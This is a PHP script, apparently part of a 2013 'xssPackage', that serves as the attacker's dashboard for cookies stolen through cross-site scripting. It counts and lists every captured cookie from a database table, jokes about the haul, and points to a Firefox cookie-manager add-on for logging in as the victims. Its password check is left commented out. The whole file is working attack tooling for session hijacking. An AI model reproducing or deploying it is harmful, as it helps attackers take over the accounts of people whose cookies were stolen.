<?php
##################################################################
# File created by @joshingeneral   				##
# part of the xssPackage           				##
# date 07/01/2013                  				##
# I have added an option to do  password protection, I know 	##
# it is weak, but it this is just  supposed to be a demo, if 	##
# you want to use this full out  make  user you do full 	##
# database with md5/sha1 with salts.				##	
##################################################################

include('config.php');
echo "<html>
	<body>";
@$db = new mysqli($hostname, $db_username, $db_password, $dbname);
// this is needed to access this file
// if you enable passwords on remote host
//$password="PASSWORD";

// if password is correct then allow user to see content
///////////////////////////////////////
// UNCOMMENT FOR PASSWORD PROTECTION  //
// if($_GET['password']==$password)   //
///////////////////////////////////////

{
	echo " <table border='1' bgcolor='44aa44' align='center' width='900'>
		<tr>
		<td colspan='2' align='center'> ";
			
	// find out how many cookies are captured for "for" loop
	$sql = "Select count(*) from capture";
	$result = $db->query($sql);
	if($result){
		$row = $result->fetch_assoc();
		$count = $row['count(*)'];
		echo "You have " . ($count) . " cookies. Don't eat them all at once :-) <p></p>";
	}
	
	echo " </td>
		</tr>";
	// loop through all the cookies that have been collected and display the contents on the page.
	for($i = 0; $i < $count; $i++)
	{
		echo "<tr>";
		echo "<td>".($i+1)."</td>";

		$sql = "Select * from capture limit $i,1";
		$result = $db->query($sql);
		if($result) {
			$row = $result->fetch_assoc();
			$cookie = $row['cookie'];
			echo "<td> $cookie </td>";
		}
		else{
			echo "Error: " . $db->error;
		}
		echo "</tr>";
	}
}
echo "<tr>
	<td colspan='2' align='center'>";
echo "	<a href=\"https://addons.mozilla.org/en-us/firefox/addon/cookies-manager-plus//\"> Use cookies manager plus in Firefox to login</a>";
echo "	</td>
      </tr>
     </table>";

echo "</body>
     </html>";

?>






					
